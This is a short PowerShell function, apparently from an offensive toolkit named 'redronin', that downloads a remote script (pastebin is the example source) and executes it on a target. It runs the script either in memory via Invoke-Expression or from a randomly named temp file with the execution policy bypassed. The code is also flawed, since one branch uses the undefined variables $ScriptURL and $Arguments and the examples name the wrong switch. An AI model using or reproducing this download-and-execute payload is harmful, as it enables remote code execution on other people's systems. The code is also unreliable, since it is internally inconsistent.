function download-exec
{
<#
.SYNOPSIS
redronin payload to download and afterwards execute any powershell script.

.DESCRIPTION
This script will download another powershell script from an URL, deploys and executes it on a target. 
The downloaded script will be saved with a random filename, to avoid this the -nodl option can be used to avoid saving the script on the target.

.PARAMETER url
The URL to download the powershell script from.

.PARAMETER nodl
With this parameter no file will be saved to the target.

.EXAMPLE
PS > download-exec http://pastebin.com/raw.php?i=####### -nodownload

.EXAMPLE
PS > download-exec http://pastebin.com/raw.php?i=####### -nodownload
This would also execute a script, but without saving it to the target

.LINK
https://github.com/itsabzyou/redronin
#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $url,

        [Switch]
        $nodl
    )
    if ($nodl -eq $true)
    {
        Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
        if($Arguments)
        {
            Invoke-Expression $Arguments
        }
    }
    else
    {
        $rand = Get-Random
        $webclient = New-Object System.Net.WebClient
        $filerandom = "$env:temp\$rand.ps1"
        $webclient.DownloadFile($url,"$filerandom")
        $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $filerandom
        Invoke-Expression $pastevalue
    }
}
